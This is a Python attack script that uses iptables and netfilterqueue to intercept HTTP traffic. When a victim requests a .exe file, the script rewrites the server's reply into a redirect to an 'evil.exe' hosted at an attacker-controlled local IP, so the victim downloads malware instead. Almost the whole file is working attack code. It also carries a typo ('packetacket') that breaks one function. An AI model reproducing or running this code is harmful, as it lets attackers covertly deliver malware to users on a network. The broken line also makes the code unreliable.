#!/usr/bin/env python
import subprocess
import netfilterqueue
import scapy.all as scapy
import argparse

# def get_arguments():
#     parser = argparse.ArgumentParser()
#     parser.add_argument("-t", "--target", dest="target", help="Target website that you want to poison")
#     parser.add_argument("-s", "--spoof", dest="spoof", help="IP that you want to spoof instead of showing the real website. Usually  your own machine")
#     args = parser.parse_args()
#     if not args.target:
#         parser.error("No target provided, use --help")
#     elif not args.spoof:
#          parser.error("No spoof IP provided, use --help")
#     return args

# args = get_arguments()
# print(args.target, args.spoof)

ack_list = []

def set_load(packet, load):
    packetacket[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if "test.exe" in scapy_packet[scapy.Raw].load:
                 ack_list.append(scapy_packet[scapy.TCP].ack)
                 print("[+] .exe download detected....replacing with malicious file")
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing File")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.182.141/evil.exe\n\n")
                packet.set_payload(str(modified_packet))
    packet.accept()


try:
    print("[+] Amening IP tables")
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 1", shell=True)
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 1", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1, process_packet)
    queue.run()

except KeyboardInterrupt:
    print("\r\n[-] Detected CTRL + C.....Quitting and restoring IP tables")
    subprocess.call("iptables --flush", shell=True)

